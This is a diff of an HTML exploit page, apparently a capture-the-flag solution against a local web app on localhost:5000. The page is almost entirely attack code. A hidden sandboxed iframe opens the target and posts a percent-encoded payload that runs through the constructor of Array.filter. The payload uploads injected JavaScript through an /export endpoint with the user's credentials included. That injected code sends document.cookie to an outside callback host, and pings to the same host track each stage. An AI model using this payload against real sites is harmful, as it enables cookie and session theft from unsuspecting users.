@@ -1,4 +1,55 @@
 <!doctype html>
+<html>
+<body>
 <script>
-new Image().src = "https://yyweqnf.request.dreamhack.games/p0?x=" + Date.now();
+const CB = "https://yyweqnf.request.dreamhack.games";
+new Image().src = CB + "/p0?ts=" + Date.now();
+
+const widgetJs =
+  "new Image().src=" + JSON.stringify(CB + "/collect?c=") +
+  "+encodeURIComponent(document.cookie)";
+
+const body =
+  "(async()=>{" +
+    "new Image().src=" + JSON.stringify(CB + "/p3?m=start") + ";" +
+    "const js=" + JSON.stringify(widgetJs) + ";" +
+    "const r=await fetch('/export',{" +
+      "method:'POST'," +
+      "headers:{'X-Card-Token':CARD_TOKEN,'Content-Type':'application/javascript'}," +
+      "body:js," +
+      "credentials:'include'" +
+    "});" +
+    "const n=await r.text();" +
+    "new Image().src=" + JSON.stringify(CB + "/p4?n=") + "+encodeURIComponent(n);" +
+    "location='http://localhost:5000/review?widget='+encodeURIComponent(n);" +
+  "})()";
+
+const enc = [...body].map(c =>
+  "%" + c.charCodeAt(0).toString(16).padStart(2, "0")
+).join("");
+
+const formula =
+  "[]['filter']['con'+'structor'](unescape('" + enc + "'))()";
+
+const child =
+  "<script>" +
+    "new Image().src=" + JSON.stringify(CB + "/p1?m=child") + ";" +
+    "const w=window.open('http://localhost:5000/preview','victim');" +
+    "new Image().src=" + JSON.stringify(CB + "/p2?opened=") + "+encodeURIComponent(!!w);" +
+    "for(let i=1;i<=8;i++){" +
+      "setTimeout(function(){" +
+        "try{w.postMessage(" + JSON.stringify(formula) + ",'*')}catch(e){" +
+          "new Image().src=" + JSON.stringify(CB + "/pe?e=") + "+encodeURIComponent(e.name)" +
+        "}" +
+      "}, i*1000);" +
+    "}" +
+  "<\/script>";
+
+const f = document.createElement("iframe");
+f.sandbox = "allow-scripts allow-popups allow-popups-to-escape-sandbox";
+f.srcdoc = child;
+f.style.display = "none";
+document.body.appendChild(f);
 </script>
+</body>
+</html>
